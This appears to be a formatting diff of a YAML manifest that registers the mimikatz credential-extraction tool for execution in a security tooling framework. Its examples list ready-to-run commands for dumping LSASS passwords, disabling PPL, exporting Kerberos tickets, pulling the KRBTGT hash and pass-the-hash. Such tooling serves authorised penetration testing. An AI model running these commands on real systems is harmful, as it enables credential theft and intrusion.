@@ -5,101 +5,103 @@ name: mimikatz
 description: Post-exploitation credential extraction tool that recovers plaintext
   passwords, NTLM hashes, Kerberos tickets, and DPAPI keys from Windows memory and
   registry hives.
-author: "Repository Maintainers"
-version: "1.0.0"
+author: Repository Maintainers
+version: 1.0.0
 capabilities:
-  - security.credential.dump.lsass
-  - security.credential.wdigest
-  - security.credential.ntlm
-  - security.credential.kerberostickets
-  - security.credential.dpapi
-  - security.credential.masterkeys
-  - security.pth
-  - security.ptt
+- security.credential.dump.lsass
+- security.credential.wdigest
+- security.credential.ntlm
+- security.credential.kerberostickets
+- security.credential.dpapi
+- security.credential.masterkeys
+- security.pth
+- security.ptt
 platforms:
-  - windows
+- windows
 risk_level: critical
 trust_level: verified
 execution_policy: enabled
 architectures:
-  - amd64
+- amd64
 dependencies: []
 related_tools:
-  - netexec
-  - impacket
+- netexec
+- impacket
 contract:
   inputs:
-    - type: windows.process.dump
-      description: LSASS process dump file
+  - type: windows.process.dump
+    description: LSASS process dump file
   outputs:
-    - type: security.credential.dump
-      description: Extracted plaintext passwords, hashes, and tickets
+  - type: security.credential.dump
+    description: Extracted plaintext passwords, hashes, and tickets
   side_effects:
-    - process_spawn
-    - filesystem_write
+  - process_spawn
+  - filesystem_write
 resource_profile:
   cpu: medium
   memory_mb: 256
   network: low
   disk_io: low
 allowed-tools:
-  - mimikatz
+- mimikatz
 parameters:
-  - name: command
-    type: string
-    required: true
-    description: "Mimikatz command (e.g., sekurlsa::logonpasswords)"
+- name: command
+  type: string
+  required: true
+  description: Mimikatz command (e.g., sekurlsa::logonpasswords)
 execution:
-  template: "mimikatz \"{command}\" exit"
+  template: mimikatz "{command}" exit
   sandbox: execFile
   timeout_seconds: 60
   shell: false
 examples:
-  - description: "One-liner dump all logon passwords"
-    command: mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
-  - description: "Load mimikatz in memory via PowerShell"
-    command: Invoke-Mimikatz -DumpCreds
-  - description: "Disable PPL (Protected Process Light) before dumping"
-    command: mimikatz "!+" "privilege::debug" "sekurlsa::logonpasswords" exit
-  - description: "Extract credentials from a LSASS dump file"
-    command: mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
-  - description: "Extract credentials from volume shadow copy"
-    command: mimikatz "lsadump::sam /server:$(hostname)" exit
-  - description: "Extract Kerberos tickets"
-    command: mimikatz "privilege::debug" "sekurlsa::tickets /export" exit
-  - description: "Extract domain SID and KRBTGT hash for golden ticket"
-    command: mimikatz "privilege::debug" "lsadump::lsa /inject /id:502" exit
-  - description: "Pass-the-hash to RDP session"
-    command: mimikatz "privilege::debug" "sekurlsa::pth /user:admin /domain:evilcorp /ntlm:<HASH> /run:mstsc.exe /restrictedadmin"
-  - description: "DPAPI master key extraction"
-    command: mimikatz "privilege::debug" "sekurlsa::dpapi" exit
+- description: One-liner dump all logon passwords
+  command: mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
+- description: Load mimikatz in memory via PowerShell
+  command: Invoke-Mimikatz -DumpCreds
+- description: Disable PPL (Protected Process Light) before dumping
+  command: mimikatz "!+" "privilege::debug" "sekurlsa::logonpasswords" exit
+- description: Extract credentials from a LSASS dump file
+  command: mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
+- description: Extract credentials from volume shadow copy
+  command: mimikatz "lsadump::sam /server:$(hostname)" exit
+- description: Extract Kerberos tickets
+  command: mimikatz "privilege::debug" "sekurlsa::tickets /export" exit
+- description: Extract domain SID and KRBTGT hash for golden ticket
+  command: mimikatz "privilege::debug" "lsadump::lsa /inject /id:502" exit
+- description: Pass-the-hash to RDP session
+  command: mimikatz "privilege::debug" "sekurlsa::pth /user:admin /domain:evilcorp
+    /ntlm:<HASH> /run:mstsc.exe /restrictedadmin"
+- description: DPAPI master key extraction
+  command: mimikatz "privilege::debug" "sekurlsa::dpapi" exit
 references:
-  - label: "mimikatz GitHub"
-    url: "https://github.com/gentilkiwi/mimikatz"
+- label: mimikatz GitHub
+  url: https://github.com/gentilkiwi/mimikatz
 techniques:
-  - credential-access
-  - privilege-escalation
+- credential-access
+- privilege-escalation
 attack_types:
-  - CredentialAccess
-  - PrivilegeEscalation
+- CredentialAccess
+- PrivilegeEscalation
 install:
-    - method: git
-      repo_url: "https://github.com/gentilkiwi/mimikatz.git"
-      commands:
-        - "git clone https://github.com/gentilkiwi/mimikatz.git"
+- method: git
+  repo_url: https://github.com/gentilkiwi/mimikatz.git
+  commands:
+  - git clone https://github.com/gentilkiwi/mimikatz.git
 items:
-  - Password
-  - Hash
-  - TGS
-  - TGT
-  - PFX
+- Password
+- Hash
+- TGS
+- TGT
+- PFX
 services:
-  - Kerberos
-  - LDAP
-  - SMB
-  - RPC
+- Kerberos
+- LDAP
+- SMB
+- RPC
+features:
+- file-system
 ---
-
 
 # mimikatz — Windows Credential Extraction
 
